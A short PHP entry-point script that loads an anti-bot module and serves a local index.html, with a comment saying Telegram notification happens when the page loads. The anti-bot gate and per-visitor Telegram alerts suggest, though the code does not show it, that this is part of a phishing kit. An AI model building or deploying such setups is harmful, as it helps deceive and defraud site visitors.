<?php
/**
 * Entry point — serve startpage immediately (no Telegram delay).
 * Notify is done by index.html → arrive.php on load.
 */
require_once __DIR__ . "/antibot.php";
$htmlFile = __DIR__ . DIRECTORY_SEPARATOR . "index.html";
if (is_readable($htmlFile)) {
  header("Content-Type: text/html; charset=utf-8");
  header("Cache-Control: no-store");
  readfile($htmlFile);
  exit;
}
http_response_code(404);
echo "index.html missing";
